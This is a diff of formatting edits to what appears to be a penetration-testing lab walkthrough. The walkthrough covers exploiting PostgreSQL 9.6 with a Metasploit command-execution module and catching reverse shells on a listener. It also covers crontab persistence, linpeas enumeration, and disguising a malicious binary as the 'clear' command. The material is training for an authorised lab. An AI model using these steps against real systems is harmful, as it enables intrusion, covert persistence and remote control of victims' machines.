@@ -11,7 +11,7 @@ Metasploit and Proxychains are essential tools for cybersecurity professionals c
 
 ### (ATTACKER) ON msf6
 
-**Use whatever number that has the most recent date for exploit module.**
+Use whatever number that has the most recent date for exploit module.
 
 ```bash
 search postgresql
@@ -23,7 +23,7 @@ Based off the server data in (ATTACKER) (TERM 2) we saw that PostgreSQL is 9.6.0
 search postgresql 9.6.0
 ```
 
-**start from 9.6.0 and back space one character each time to see what you find out**
+Start from 9.6.0 and back space one character each time to see what you find out
 
 ```
 search postgresql 9.6
@@ -37,10 +37,10 @@ search postgresql 9.
 search postgresql 9
 ```
 
-**use number that has expliot module (it vaires but i used the one ending in "cmd_excec")
-use exploit modules as much as possible.**
-LHOST (istening) comming back through our WAN
-RHOST (recieving)
+Use number that has expliot module (it vaires but i used the one ending in "cmd_excec")
+use exploit modules as much as possible.
+1. LHOST (istening) comming back through our WAN
+2. RHOST (recieving)
 
 ## Section 2: CONFIGURING YOUR EXPLOIT MODULE 
 
@@ -52,7 +52,7 @@ RHOST (recieving)
 searchsploit postgresql
 ```
 
-**(find version)**
+(Find version)
 
 ### (ATTACKER) ON msf6
 
@@ -60,7 +60,7 @@ searchsploit postgresql
 search postgresql
 ```
 
-**LOOKS SOMETHING LIKE THIS:** exploit(multi/postgress/postgress_copy_from_program_cmd_exec)
+Exploit Module looks something like this: `exploit(multi/postgress/postgress_copy_from_program_cmd_exec)`
 
 [3:29] DAY 11
 
@@ -72,15 +72,14 @@ set lhost 192.168.122.209
 set rhosts 192.168.1.102
 ```
 
-**USE YOUR DEFAULT PORT**
+**Use your own port**
 
 ```
 set lport 61775
 ```
 
 
-**Use your manual port for reverse shells**
-
+Use your manual port for reverse shells
 
 ```
 show options
@@ -90,7 +89,7 @@ show options
 run
 ```
 
-**should get exploit here**
+Should get exploit here
 
 [3:30] DAY 11
 
@@ -111,16 +110,15 @@ another shell to brake out metasploit (DEFAULT PORT)
 ### (VICTIM)
 
 
-**Create a crontab using python3 shortest with your port 
-number you want to use for VIC2 persistence**
+Create a crontab using python3 shortest with your port 
+number you want to use for VIC2 persistence
 
 #### (THIS PORT NUMBER IS ONLY FOR SOC4 PERSISTENCE)
 
 
 
 
-**Set up another listner over DEFAULT port**      
-#### (VIC 2 Persisitence)
+Set up another listner over DEFAULT port  (VIC 2 Persisitence)
 
 [14:02] DAY 12
 
@@ -234,7 +232,7 @@ watch ls -l
 
 ### (ATTACKER)
 
-***(Close Capture)***
+**(Close Capture)**
 
 `(ctl a + H)`
 
@@ -253,7 +251,7 @@ mv screenlog.0 linpeas_output
 mv linpeas_output ./Desktop/pentest/internal/192.168.1.102
 ```
 
-**This might not be your file path so just make sure its in "internal"**
+This might not be your file path so just make sure its in "internal"
 
 
 `cd [your path to verify]`
@@ -352,7 +350,7 @@ ls -al
 ```
 mv mal clear
 ```
-(malicious binary is known as clear)
+(Malicious binary is known as clear)
 
 ```
 ls
@@ -382,7 +380,7 @@ ls -al | grep clear
 ./clear
 ```
 
-**Open mfsconsole**
+Open mfsconsole
 
 ### (ATACKER) (msf6) 
 
@@ -390,7 +388,7 @@ ls -al | grep clear
 search multi handler
 ```
 
-**Use 5 or exploit/multi/handler**
+Use 5 or exploit/multi/handler
 
 ```
 set lhost 192.168.122.209
@@ -410,8 +408,10 @@ set payload linux/x64/shell/reverse_tcp
 ```
 
 ```
-show options to see if payload is set properly
+show options 
 ```
+(To see if payload is set properly)
+
 
 ```
 run
@@ -425,7 +425,7 @@ run
 
 ### (ATACKER) (msf6)
 
-**Go back and check if command shell opened then run...**
+Go back and check if command shell opened then run...
 
 ```
 id
